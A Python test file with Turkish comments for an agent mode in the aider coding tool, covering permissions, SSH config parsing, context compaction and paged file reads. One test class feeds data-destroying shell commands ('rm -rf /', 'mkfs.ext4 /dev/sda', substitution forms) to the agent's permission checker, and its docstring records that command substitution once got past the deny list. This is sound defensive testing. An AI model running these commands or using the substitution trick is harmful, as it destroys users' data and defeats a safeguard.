        yanit = {"choices": [{"message": {"tool_calls": [{"id": "c1"}]}}]}
        with patch("aider.agent.model_setup._istek", return_value=yanit):
            destek, _aciklama = arac_destegi_dene("https://x/v1", "k", "m")
        self.assertIs(destek, True)

    def test_duz_metin_donerse_desteklemiyor(self):
        from aider.agent.model_setup import arac_destegi_dene

        yanit = {"choices": [{"message": {"content": "Ankara'da hava güzel."}}]}
        with patch("aider.agent.model_setup._istek", return_value=yanit):
            destek, aciklama = arac_destegi_dene("https://x/v1", "k", "m")
        self.assertIs(destek, False)
        self.assertIn("düz metin", aciklama)

    def test_endpoint_yanit_vermezse_karar_verilmez(self):
        from aider.agent.model_setup import arac_destegi_dene

        with patch("aider.agent.model_setup._istek", return_value=None):
            destek, _a = arac_destegi_dene("https://x/v1", "k", "m")
        self.assertIsNone(destek)

    def test_desteklenmiyorsa_kullanici_uyarilir(self):
        from aider.agent.model_setup import run_setup

        io = MagicMock()
        io.prompt_ask.side_effect = ["1", "https://x/v1", "k", "m", "", ""]

        def sahte(url, api_key, veri=None, timeout=None):
            if url.endswith("/chat/completions"):
                return {"choices": [{"message": {"content": "merhaba"}}]}
            return None

        with tempfile.TemporaryDirectory() as tmp:
            with patch("aider.agent.model_setup._istek", sahte):
                run_setup(io, home=Path(tmp))
        uyarilar = [c.args[0] for c in io.tool_warning.call_args_list if c.args]
        self.assertTrue(any("araç çağırmadı" in u for u in uyarilar), uyarilar)


class TestIkameAcigi(unittest.TestCase):
    """Komut ikamesi oto modda reddetme listesini atlıyordu.

    ÖLÇÜLDÜ: PermissionSet(mode=auto).decide("Bash", {"command":
    "rm -rf $(echo /)"}) -> allow. Yerleşik "rm -rf /*" deseni ikame edilmiş
    dizgeyle eşleşmiyor ve decide'ın sonundaki koşulsuz ALLOW komutu
    geçiriyordu.
    """

    def setUp(self):
        self.perms = PermissionSet(mode=MODE_AUTO)

    def _karar(self, komut, arac="Bash"):
        return self.perms.decide(arac, {"command": komut}, mutating=True)

    def test_ikameli_komut_otomatik_onaylanmaz(self):
        # Değişmez "ASK olsun" değil, "ALLOW OLMASIN": reddetme deseni zaten
        # tutuyorsa DENY dönmesi daha güçlü bir sonuç.
        for komut in (
            "rm -rf $(echo /)",
            "rm -rf `echo /`",
            "dd if=$(cat /tmp/x) of=/dev/sda",
            "cat <(echo tehlike)",
        ):
            self.assertNotEqual(self._karar(komut), ALLOW, komut)

    def test_reddetme_desenine_uymayan_ikame_sorulur(self):
        self.assertEqual(self._karar("rm -rf $(echo /)"), ASK)
        self.assertEqual(self._karar("cat <(echo tehlike)"), ASK)

    def test_eval_otomatik_onaylanmaz(self):
        # eval komutun gerçek içeriğini dizgenin içine saklıyor.
        self.assertEqual(self._karar('eval "rm -rf /"'), ASK)

    def test_uzak_komutta_da_gecerli(self):
        self.assertEqual(self._karar("rm -rf $(echo /)", arac="Ssh"), ASK)

    def test_dogrudan_yikici_komut_hala_reddedilir(self):
        self.assertEqual(self._karar("rm -rf /"), DENY)
        self.assertEqual(self._karar("mkfs.ext4 /dev/sda"), DENY)

    def test_zararsiz_komutlar_akisi_kesmez(self):
        for komut in ("ls -la", "git status", "cat dosya.txt"):
            self.assertEqual(self._karar(komut), ALLOW, komut)

    def test_izin_kurali_ikameyi_actiramaz(self):
        # Açık bir allow kuralı bile ikameli komutu otomatik onaylayamaz.
        perms = PermissionSet(allow=["Bash(echo:*)"], mode=MODE_ASK)
        self.assertEqual(perms.decide("Bash", {"command": "echo $(whoami)"}, mutating=True), ASK)


class TestSshConfigInclude(unittest.TestCase):
    """Kurum kurulumlarında ana dosya çoğu zaman yalnızca Include içeriyor."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.ssh = Path(self.tmp.name)

    def tearDown(self):
        self.tmp.cleanup()

    def test_include_edilen_dosyadaki_hostlar_okunur(self):
        from aider.agent.ssh_tool import known_hosts

        (self.ssh / "config.d").mkdir()
        (self.ssh / "config.d" / "kurum").write_text("Host srvsatellite\n  User root\n")
        cfg = self.ssh / "config"
        cfg.write_text("Include config.d/*\n\nHost skyup\n")

        adlar = known_hosts(cfg)
        self.assertIn("skyup", adlar)
        self.assertIn("srvsatellite", adlar)

    def test_mutlak_ve_goreli_include(self):
        from aider.agent.ssh_tool import known_hosts

        harici = self.ssh / "harici.conf"
        harici.write_text("Host uzak01\n")
        cfg = self.ssh / "config"
        cfg.write_text(f"Include {harici}\n")
        self.assertIn("uzak01", known_hosts(cfg))

    def test_dongusel_include_sonsuza_gitmez(self):
        from aider.agent.ssh_tool import known_hosts

        a = self.ssh / "config"
        b = self.ssh / "b.conf"
        a.write_text("Include b.conf\nHost bir\n")
        b.write_text("Include config\nHost iki\n")
        adlar = known_hosts(a)
        self.assertIn("bir", adlar)
        self.assertIn("iki", adlar)

    def test_olmayan_include_sessizce_atlanir(self):
        from aider.agent.ssh_tool import known_hosts

        cfg = self.ssh / "config"
        cfg.write_text("Include yok/olan/*\nHost skyup\n")
        self.assertEqual(known_hosts(cfg), ["skyup"])

    def test_joker_hostlar_hala_atlanir(self):
        from aider.agent.ssh_tool import known_hosts

        cfg = self.ssh / "config"
        cfg.write_text("Host *\n  ServerAliveInterval 60\n\nHost skyup\n")
        self.assertEqual(known_hosts(cfg), ["skyup"])


class TestCoderDegisiminde(unittest.TestCase):
    """Agent'a bağlı durum coder değişince bırakılmalı.

    Ölçüldü: /ask ile başka bir coder'a geçildiğinde io.agent_status hâlâ
    ölü AgentCoder'a bağlı kalıyor ve prompt "⏵ onay modu" yazmayı
    sürdürüyor — kullanıcı agent modunda sandığı hâlde değil.
    """

    def test_kancalar_temizlenir_ve_mcp_kapanir(self):
        from aider.main import agent_kancalarini_birak

        io = MagicMock()
        io.agent_status = lambda: "⏵ onay modu"
        io.agent_cycle_mode = lambda: None
        coder = MagicMock()

        agent_kancalarini_birak(io, coder)

        self.assertIsNone(io.agent_status)
        self.assertIsNone(io.agent_cycle_mode)
        coder.mcp.shutdown.assert_called_once()

    def test_mcp_olmayan_coder_sorun_cikarmaz(self):
        from aider.main import agent_kancalarini_birak

        io = MagicMock()

        class Sade:
            pass

        agent_kancalarini_birak(io, Sade())
        self.assertIsNone(io.agent_status)

    def test_mcp_kapanma_hatasi_gecisi_engellemez(self):
        from aider.main import agent_kancalarini_birak

        io = MagicMock()
        coder = MagicMock()
        coder.mcp.shutdown.side_effect = OSError("süreç yok")
        agent_kancalarini_birak(io, coder)
        self.assertIsNone(io.agent_status)


class TestFrontmatterAyristirma(unittest.TestCase):
    """İki sessiz kayıp: satır devamı ve tırnak kırpma.

    İkisi de tetikleyici kelimeleri yiyordu, yani beceri yükleniyor ama
    doğru istekte tetiklenmiyordu — teşhisi zor bir arıza.
    """

    def test_girintili_satir_degerin_devamidir(self):
        meta, _govde = _parse_frontmatter(
            '---\nname: pip\ndescription: NE ZAMAN? "pip"\n'
            '  ve "paket" isteklerinde tetiklenir.\n---\n\ngövde\n'
        )
        self.assertIn("paket", meta["description"])
        self.assertIn("tetiklenir", meta["description"])

    def test_devam_satirindaki_tetikleyici_kaybolmaz(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = Path(tmp) / "paket"
            d.mkdir()
            (d / "SKILL.md").write_text(
                '---\nname: paket\ndescription: Paket işleri. "dnf"\n'
                '  ve "rpm" isteklerinde tetiklenir.\n---\n\nGÖVDE\n',
                encoding="utf-8",
            )
            lib = SkillLibrary([Path(tmp)])
            self.assertTrue(lib.eslestir("rpm paketini kur"))

    def test_sondaki_tirnakli_tetikleyici_bozulmaz(self):
        # Değerin iki ucundan ayrım gözetmeden tırnak kırpmak, tırnaklı bir
        # ifadeyle biten açıklamanın son tetikleyicisini yiyordu.
        meta, _ = _parse_frontmatter(
            '---\nname: x\ndescription: Şunlarda: "ansible", "playbook"\n---\n\ngövde\n'
        )
        self.assertTrue(meta["description"].endswith('"playbook"'), meta["description"])

    def test_tamami_tirnakli_deger_soyulur(self):
        meta, _ = _parse_frontmatter('---\nname: "tirnakli"\n---\n\ngövde\n')
        self.assertEqual(meta["name"], "tirnakli")

    def test_yorum_satirlari_atlanir(self):
        meta, _ = _parse_frontmatter("---\n# bu bir yorum\nname: x\ndescription: y\n---\n\ngövde\n")
        self.assertEqual(meta["name"], "x")
        self.assertNotIn("#", meta)

    def test_depodaki_37_beceri_hala_okunuyor(self):
        from aider.agent.skills import YERLESIK_BECERILER

        lib = SkillLibrary([YERLESIK_BECERILER])
        self.assertEqual(len(lib.skills), 37)


class TestMCPHataAyrintisi(unittest.TestCase):
    """Sunucu başlatılamadığında SEBEBİ görünmeli.

    stderr DEVNULL'a gidiyordu; kullanıcı yalnızca "başlatılamadı" görüyor
    ve çevrimdışı bir sunucuda bunu teşhis etmek çok zor.
    """

    def test_sunucu_hata_ciktisi_mesaja_giriyor(self):
        from aider.agent.mcp import MCPError, MCPServer

        server = MCPServer(
            name="bozuk",
            command=sys.executable,
            args=["-c", "import sys; sys.stderr.write('ModuleNotFoundError: yok\\n')"],
        )
        try:
            with self.assertRaises(MCPError) as cm:
                server.start()
            self.assertIn("sunucu çıktısı", str(cm.exception))
            self.assertIn("ModuleNotFoundError", str(cm.exception))
        finally:
            server.stop()

    def test_stderr_dosyasi_kapatiliyor(self):
        from aider.agent.mcp import MCPServer

        server = MCPServer(name="x", command=sys.executable, args=["-c", "pass"])
        try:
            server.start()
        except Exception:
            pass
        server.stop()
        self.assertIsNone(server._stderr_dosyasi)


from aider.agent import sikistirma  # noqa: E402


class TestSikistirmaKesme(unittest.TestCase):
    """Özet kesme noktası araç çağrısı çiftlerini bölmemeli.

    tool_calls taşıyan assistant mesajı kendi role="tool" yanıtlarından
    ayrılırsa endpoint isteği reddediyor — oturum budamasındaki tuzağın aynısı.
    """

    def _gecmis(self, tur=5):
        mesajlar = []
        for i in range(tur):
            mesajlar += [
                dict(role="user", content=f"istek {i}"),
                dict(
                    role="assistant",
                    content="",
                    tool_calls=[
                        dict(
                            id=f"c{i}",
                            type="function",
                            function=dict(name="Bash", arguments='{"command":"ls"}'),
                        )
                    ],
                ),
                dict(role="tool", tool_call_id=f"c{i}", name="Bash", content="çıktı " * 50),
                dict(role="assistant", content=f"özet {i}"),
            ]
        return mesajlar

    def test_kesme_her_zaman_user_mesajina_denk_gelir(self):
        mesajlar = self._gecmis()
        for korunan in (1, 2, 3, 4):
            kes = sikistirma.kesme_noktasi(mesajlar, korunan)
            self.assertEqual(mesajlar[kes]["role"], "user", f"korunan={korunan}")

    def test_korunan_blokta_yetim_tool_mesaji_kalmaz(self):
        mesajlar = self._gecmis()
        for korunan in (1, 2, 3):
            kalan = mesajlar[sikistirma.kesme_noktasi(mesajlar, korunan) :]
            acik = set()
            for msg in kalan:
                for cagri in msg.get("tool_calls") or []:
                    acik.add(cagri["id"])
                if msg.get("role") == "tool":
                    self.assertIn(msg["tool_call_id"], acik, f"yetim tool, korunan={korunan}")

    def test_yeterince_gecmis_yoksa_sifir(self):
        self.assertEqual(sikistirma.kesme_noktasi(self._gecmis(tur=2), 2), 0)
        self.assertEqual(sikistirma.kesme_noktasi([], 2), 0)

    def test_korunan_tur_sayisi_kadar_user_mesaji_kalir(self):
        mesajlar = self._gecmis()
        kalan = mesajlar[sikistirma.kesme_noktasi(mesajlar, 2) :]
        self.assertEqual(sum(1 for m in kalan if m["role"] == "user"), 2)


class TestSikistirmaDokum(unittest.TestCase):
    def test_arac_cagrilari_ve_sonuclari_dokume_girer(self):
        mesajlar = [
            dict(role="user", content="diski kontrol et"),
            dict(
                role="assistant",
                content="",
                tool_calls=[
                    dict(
                        id="c1",
                        type="function",
                        function=dict(name="Ssh", arguments='{"host":"srvsatellite"}'),
                    )
                ],
            ),
            dict(role="tool", tool_call_id="c1", name="Ssh", content="/dev/sda3 %91"),
        ]
        metin = sikistirma.dokum(mesajlar)
        self.assertIn("diski kontrol et", metin)
        self.assertIn("Ssh(", metin)
        self.assertIn("srvsatellite", metin)
        self.assertIn("/dev/sda3 %91", metin)

    def test_uzun_arac_ciktisi_kisaltilir(self):
        mesajlar = [dict(role="tool", tool_call_id="c1", name="Bash", content="x" * 5_000)]
        metin = sikistirma.dokum(mesajlar, arac_tavani=100)
        self.assertLess(len(metin), 400)
        self.assertIn("karakter", metin)

    def test_onceki_ozet_kirpmadan_muaf(self):
        # Arka arkaya sıkıştırmalarda en eski bilgi sessizce erimemeli.
        onceki = sikistirma.ozet_mesaji("İLK OTURUMDA KURULAN SUNUCU: splsonatype01")
        mesajlar = [onceki]
        mesajlar += [dict(role="user", content="y" * 4_000) for _ in range(20)]
        metin = sikistirma.dokum(mesajlar, tavan=5_000)
        self.assertIn("splsonatype01", metin)
        self.assertTrue(metin.startswith(sikistirma.OZET_ONEKI))


class TestSikistirmaUygula(unittest.TestCase):
    def test_ozet_assistant_rolunde(self):
        # İki user mesajı arka arkaya gelirse vLLM/Qwen sohbet şablonu bozuluyor.
        mesajlar = [dict(role="user", content=f"istek {i}") for i in range(5)]
        yeni = sikistirma.uygula(mesajlar, "özet metni", sikistirma.kesme_noktasi(mesajlar, 2))
        self.assertEqual(yeni[0]["role"], "assistant")
        self.assertEqual(yeni[1]["role"], "user")
        self.assertIn("özet metni", yeni[0]["content"])

    def test_korunan_turlar_aynen_kalir(self):
        mesajlar = [dict(role="user", content=f"istek {i}") for i in range(5)]
        yeni = sikistirma.uygula(mesajlar, "özet", sikistirma.kesme_noktasi(mesajlar, 2))
        self.assertEqual([m["content"] for m in yeni[1:]], ["istek 3", "istek 4"])


class TestSikistirmaCoder(unittest.TestCase):
    """Sıkıştırma coder'a bağlandığında gerçekten geçmişi değiştiriyor mu."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        self.prev = os.getcwd()
        os.chdir(self.root)

    def tearDown(self):
        os.chdir(self.prev)
        self.tmp.cleanup()

    def _coder(self, **kwargs):
        from aider.coders import Coder
        from aider.io import InputOutput
        from aider.models import Model

        return Coder.create(
            main_model=Model("gpt-4o"),
            edit_format="agent",
            io=InputOutput(yes=True, pretty=False, fancy_input=False),
            fnames=[],
            use_git=False,
            stream=False,
            **kwargs,
        )

    def _doldur(self, coder, tur=6):
        coder.done_messages = []
        coder.cur_messages = []
        for i in range(tur):
            coder.cur_messages += [
                dict(role="user", content=f"istek {i}"),
                dict(role="assistant", content="tamam " * 200),
            ]

    def test_sikistir_gecmisi_kucultur(self):
        coder = self._coder()
        self._doldur(coder)
        onceki = sikistirma.toplam_karakter(coder.done_messages + coder.cur_messages)

        coder.main_model.simple_send_with_retries = MagicMock(return_value="kısa özet")
        kes = coder.sikistir()

        self.assertGreater(kes, 0)
        self.assertEqual(coder.cur_messages, [])
        sonraki = sikistirma.toplam_karakter(coder.done_messages)
        self.assertLess(sonraki, onceki)
        self.assertIn("kısa özet", coder.done_messages[0]["content"])

    def test_bos_ozet_gecmisi_bozmaz(self):
        # Yarım bir özetle değiştirmek, hiç özetlememekten kötü.
        coder = self._coder()
        self._doldur(coder)
        onceki = list(coder.cur_messages)

        coder.main_model.simple_send_with_retries = MagicMock(return_value="  ")
        self.assertEqual(coder.sikistir(), 0)
        self.assertEqual(coder.cur_messages, onceki)

    def test_ozetleme_hatasi_gecmisi_bozmaz(self):
        coder = self._coder()
        self._doldur(coder)
        onceki = list(coder.cur_messages)

        coder.main_model.simple_send_with_retries = MagicMock(side_effect=RuntimeError("bağlantı"))
        self.assertEqual(coder.sikistir(), 0)
        self.assertEqual(coder.cur_messages, onceki)

    def test_oto_sikistirma_sinir_asilinca_tetiklenir(self):
        coder = self._coder()
        self._doldur(coder, tur=8)
        coder._baglam_siniri = lambda: 100
        coder.main_model.simple_send_with_retries = MagicMock(return_value="özet")

        coder._oto_sikistir()
        coder.main_model.simple_send_with_retries.assert_called_once()

    def test_oto_sikistirma_kapatilabilir(self):
        coder = self._coder(auto_compact=False)
        self._doldur(coder, tur=8)
        coder._baglam_siniri = lambda: 100
        coder.main_model.simple_send_with_retries = MagicMock(return_value="özet")

        coder._oto_sikistir()
        coder.main_model.simple_send_with_retries.assert_not_called()

    def test_sinir_asilmadan_tetiklenmez(self):
        coder = self._coder()
        self._doldur(coder, tur=2)
        coder._baglam_siniri = lambda: 10_000_000
        coder.main_model.simple_send_with_retries = MagicMock(return_value="özet")

        coder._oto_sikistir()
        coder.main_model.simple_send_with_retries.assert_not_called()


class TestKucukPencere(unittest.TestCase):
    """16k pencereli bir modelde sabit yük iş yapacak yer bırakmalı.

    Ölçüm (gpt-4o tokenizer, 16.384 token pencere): düzeltmeden önce sistem
    promptu 4.549 token, bunun 3.646'sı 37 becerinin katalogu. Araç şemaları
    2.257. Toplam sabit yük pencerenin %42'si; 800 satırlık bir dosyayı bir
    kez okumak kalanı bitiriyordu.
    """

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        self.prev = os.getcwd()
        os.chdir(self.root)

    def tearDown(self):
        os.chdir(self.prev)
        self.tmp.cleanup()

    def _coder(self, pencere):
        from aider.coders import Coder
        from aider.io import InputOutput
        from aider.models import Model

        model = Model("gpt-4o")
        model.info = dict(model.info or {})
        model.info["max_input_tokens"] = pencere
        return Coder.create(
            main_model=model,
            edit_format="agent",
            io=InputOutput(yes=True, pretty=False, fancy_input=False),
            fnames=[],
            use_git=False,
            stream=False,
        )

    def test_sabit_yuk_pencerenin_dortte_birini_asmaz(self):
        coder = self._coder(16384)
        sistem = coder.fmt_system_prompt(coder.gpt_prompts.main_system)
        semalar = json.dumps(
            coder.registry.schemas(enabled=coder.available_tools()), ensure_ascii=False
        )
        sabit = coder.main_model.token_count(sistem) + coder.main_model.token_count(semalar)
        self.assertLess(sabit, 16384 * 0.25, f"sabit yük {sabit} token")

    def test_katalog_kucuk_pencerede_adlara_iner(self):
        coder = self._coder(16384)
        katalog = coder.ctx.skills.catalog(coder.katalog_butcesi)
        self.assertNotIn("\n- ", katalog, "küçük pencerede tam açıklamalar düşmeli")

    def test_katalog_buyuk_pencerede_tam_kalir(self):
        coder = self._coder(200_000)
        katalog = coder.ctx.skills.catalog(coder.katalog_butcesi)
        if coder.ctx.skills.skills:
            self.assertIn("\n- ", katalog, "büyük pencerede katalog kısılmamalı")

    def test_katalog_butce_sifirsa_bosalir(self):
        from aider.agent.skills import SkillLibrary

        kutuphane = SkillLibrary([])
        kutuphane.load()
        if kutuphane.skills:
            self.assertEqual(kutuphane.catalog(1), "")


class TestReadSayfalama(unittest.TestCase):
    """Büyük dosya bağlama sığmadığında model devamı nereden isteyeceğini bilmeli."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        self.prev = os.getcwd()
        os.chdir(self.root)
        self.dosya = self.root / "envanter.txt"
        self.dosya.write_text(
            "\n".join(
                f"srvhost{i:04d}.kurum.local  10.13.{i // 256}.{i % 256}" for i in range(800)
            ),
            encoding="utf-8",
        )

    def tearDown(self):
        os.chdir(self.prev)
        self.tmp.cleanup()

    def _ctx(self, pencere=16384):
        ctx = make_ctx(self.root)
        ctx.coder.main_model.info = {"max_input_tokens": pencere}
        return ctx

    def test_sayfa_butceyi_asmaz(self):
        from aider.agent.tools import ReadTool, cikti_siniri

        ctx = self._ctx()
        sonuc = ReadTool().run(ctx, "envanter.txt")
        self.assertLessEqual(len(sonuc), cikti_siniri(ctx))

    def test_devam_offseti_yaziliyor(self):
        from aider.agent.tools import ReadTool

        sonuc = ReadTool().run(self._ctx(), "envanter.txt")
        self.assertIn("offset=", sonuc.splitlines()[0])

    def test_sayfalar_dosyanin_tamamini_kapsar(self):
        from aider.agent.tools import ReadTool

        ctx = self._ctx()
        offset, gorulen, sayfa = 1, 0, 0
        while offset and sayfa < 30:
            sayfa += 1
            sonuc = ReadTool().run(ctx, "envanter.txt", offset=offset)
            bas = sonuc.splitlines()[0]
            aralik = bas.split("satır ")[1].split(",")[0]
            ilk, son = (int(x) for x in aralik.split("-"))
            self.assertEqual(ilk, offset, "sayfalar arasında boşluk var")
            gorulen = son
            offset = int(bas.split("offset=")[1].rstrip(")")) if "offset=" in bas else None
        self.assertEqual(gorulen, 800, "dosyanın tamamı okunamadı")

    def test_sigan_dosya_tek_sayfada_biter(self):
        from aider.agent.tools import ReadTool

        (self.root / "kucuk.txt").write_text("\n".join(f"satır {i}" for i in range(50)))
        bas = ReadTool().run(self._ctx(), "kucuk.txt").splitlines()[0]
        self.assertNotIn("offset=", bas)
        self.assertIn("satır 1-50", bas)

    def test_buyuk_pencere_daha_cok_satir_okur(self):
        from aider.agent.tools import ReadTool

        def satir_sayisi(pencere):
            bas = ReadTool().run(self._ctx(pencere), "envanter.txt").splitlines()[0]
            ilk, son = (int(x) for x in bas.split("satır ")[1].split(",")[0].split("-"))
            return son - ilk + 1

        self.assertGreater(satir_sayisi(200_000), satir_sayisi(16384))
